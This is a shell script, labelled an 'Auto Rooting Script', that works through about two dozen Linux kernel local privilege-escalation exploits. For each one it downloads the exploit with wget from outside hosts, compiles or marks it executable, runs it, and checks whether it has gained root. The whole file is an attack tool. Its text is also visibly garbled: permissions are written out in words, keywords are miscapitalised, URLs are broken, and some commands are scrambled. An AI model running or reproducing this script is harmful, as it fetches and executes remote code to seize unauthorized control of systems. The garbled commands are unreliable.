#! / Bin / sh  
# Auto Rooting Script ver 1.0  
# _____ __________ __ __  
# / _ \ __ ___ / | _ ____ \ ______ \ ____ _____/ | _  
# / / _ \ \ | | \ __ \ / _ \ | _ / / _ \ / _ \ __ \  
# / | \ | / | | (<_>) | | (<_> | <_>) |  
# \ ____|__ /____/ | __ | \ ____/ |____|_ / \ ____/ \ ____/|__|  
# \ / \ /  
# To start script ". / Aroot.sh"  
# Developers: AnnexxEmpire, axe  
# Greetz to all members of SSteam  

Checkroot() {  
if [ "$ (id-u)" = "0" ]; Then  
cd ..;  
rm -r Expl;  
echo "Got root: D";  
exit;  
else  
echo "No good. Still"`Whoami`;  
echo "";  
fi;  
}  

uname -a;  
mkdir Expl;  
Expl cd;  
echo "Checking if root Already ...";  
Checkroot;  

echo "Trying ... Wunderbar";  
wget http:/ / www.tux-planet.fr/public/hack/exploits/kernel/sock-sendpage-local-root-exploit.tar.gz;  
tar -Xvf sock-Sendpage-local-root-exploit.tar.gz;  
cd sock-Sendpage-local-root-exploit;  
. /Wunderbar_Emporium.sh;  
Checkroot;  

echo "Trying Gayros ...";  
wget http:/ / www.tux-planet.fr/public/hack/exploits/kernel/local-root-exploit-gayros.c;  
gcc -o Gayros local-root-exploit-Gayros.c;  
. /Gayros;  
Checkroot;  

echo "Trying Vmsplice ...";  
wget http:/ / www.tux-planet.fr/public/hack/exploits/kernel/vmsplice-local-root-exploit.c;  
gcc -o Vmsplice-local-root-exploit Vmsplice-local-root-exploit.c;  
. /Vmsplice-local-root-exploit;  
Checkroot;  

echo "Trying 2.6.x Localroot ...";  
wget http:/ / Rmccurdy.com/Scripts/Downloaded/Localroot/2.6.x/X2;  
. /x2;  
Checkroot;  

echo "Trying Localroot 2.6.24 ...";  
wget http:/ / S3Ym3N.by.ru/Localroot/2.6.24/2.6.24X.c;  
gcc 2.6.24X.c -o 2.6.24X;  
. /2.6.24X;  
Checkroot;  

echo "Trying from 2.4 to 2.6 [Pwned] Localroot ...";  
wget http:/ / S3Ym3N.by.ru/Localroot/2.4 202.6/Pwned.c%;  
gcc Pwned.c -o Pwned;  
. /Pwned;  
Checkroot;  

echo "Trying 2.6.4 [Hudo] Localroot ...";  
wget http:/ / S3Ym3N.by.ru/Localroot/2.6.4/Hudo.c;  
gcc Hudo.c -o Hudo;  
. /Hudo;  
Checkroot;  

echo "Trying 2.6.9-22 [Prctl] Localroot ...";  
wget http:/ / S3Ym3N.by.ru/Localroot/2.6.9-22/Prctl.c;  
gcc Prctl.c -o Prctl;  
. /Prctl;  
Checkroot;  

echo "Trying 2.6.12 [Elfcd2] Localroot ...";  
wget http:/ / S3Ym3N.by.ru/Localroot/2.6.12/Elfcd2.c;  
gcc Elfcd2.c -o Elfcd2;  
. /Elfcd2;  
Checkroot;  

echo "Trying 2.6.13-17 Localroot ...";  
wget http:/ / s3ym3n.by.ru/localroot/2.6.13-17/2.6.13_17_4_2011.sh;  
chmod 2.6.13_17_4_2011 seven hundred and fifty-five.sh;  
. /2.6.13_17_4_2011.sh;  
Checkroot;  

echo "Trying 2.6.13 [Raptor-Prctl] Localroot ...";  
wget http:/ / S3Ym3N.by.ru/Localroot/2.6.13/Raptor-Prctl.c;  
gcc Raptor-Prctl.c -o Raptor-Prctl;  
. /Raptor_Prctl;  
Checkroot;  

echo "Trying 2.6.14 [Raptor] Localroot ...";  
wget http:/ / S3Ym3N.by.ru/Localroot/2.6.14/Raptor;  
chmod seven hundred seventy-seven Raptor;  
. /Raptor;  
Checkroot;  

echo "Trying 2.6.15 [Raptor] Localroot ...";  
wget http:/ / S3Ym3N.by.ru/Localroot/2.6.15/Raptor;  
chmod seven hundred seventy-seven Raptor;  
. /Raptor;  
Checkroot;  

echo "Trying 2.6.17-4 [Raptor-Prctl] Localroot ...";  
wget http:/ / S3Ym3N.by.ru/Localroot/2.6.17-4/Raptor-Prctl.c;  
gcc Raptor-Prctl.c -o Raptor-Prctl;  
. /Raptor-Prctl;  
Checkroot;  

echo "Trying 2.6.10 [Uselib24] Localroot ...";  
wget http:/ / S3Ym3N.by.ru/Localroot/2.6.10/Uselib24.c;  
gcc Uselib24.c -o Uselib24;  
. /Uselib24;  
Checkroot;  

echo "Trying 2.6.11 [Krad] Localroot ...";  
wget http:/ / S3Ym3N.by.ru/Localroot/2.6.11/Krad;  
chmod seven hundred seventy-seven Krad;  
. /Krad;  
Checkroot;  

echo "Trying 2.6.x Localroot ...";  
wget http:/ / Rmccurdy.com/Scripts/Downloaded/Localroot/2.6.x/X;  
chmod seven hundred seventy-seven x;  
. /x;  
Checkroot;  

echo "Trying 2.6.x [Uselib24] Localroot ...";  
wget http:/ / rmccurdy.com/scripts/downloaded/localroot/2.6.x/uselib24;  
chmod seven hundred seventy-seven Uselib24;  
. /Uselib24;  
Checkroot;  

echo "Trying 2.6.x [Root2] Localroot ...";  
wget http:/ / rmccurdy.com/scripts/downloaded/localroot/2.6.x/root2;  
chmod seven hundred seventy-seven Root2;  
. /Root2;  
Checkroot;  

echo "Trying 2.6.x [Kmod2] Localroot ...";  
wget http:/ / rmccurdy.com/scripts/downloaded/localroot/2.6.x/kmod2;  
chmod seven hundred seventy-seven Kmod2;  
. /Kmod2;  
Checkroot;  

echo "Trying Localroot 2.6.23 ...";  
wget http:/ / S3Ym3N.by.ru/Localroot/2.6.23/2.6.23.c;  
2.6.23 gcc.c -o 2.6.23;  
. /2.6.23;  
Checkroot;  

echo "Trying 2.6.x Localroot ...";  
wget http:/ / rmccurdy.com/scripts/downloaded/localroot/2.6.x/exp.sh;  
chmod seven hundred and fifty-five exp.sh;  
. /exp.sh;  
Checkroot;  

echo "Trying 2.6.x [Elflbl] Localroot ...";  
wget http:/ / rmccurdy.com/scripts/downloaded/localroot/2.6.x/elflbl;  
chmod seven hundred seventy-seven Elflbl;  
. /Elflbl;  
Checkroot;  

echo "Trying 2.6.x [Cw7.3] Localroot ...";  
wget http:/ / rmccurdy.com/scripts/downloaded/localroot/2.6.x/cw7.3;  
chmod seven hundred seventy-seven Cw7.3;  
. /Cw7.3;  
Checkroot;  

echo "Done with Exploits. Failed to Achieve root: <";  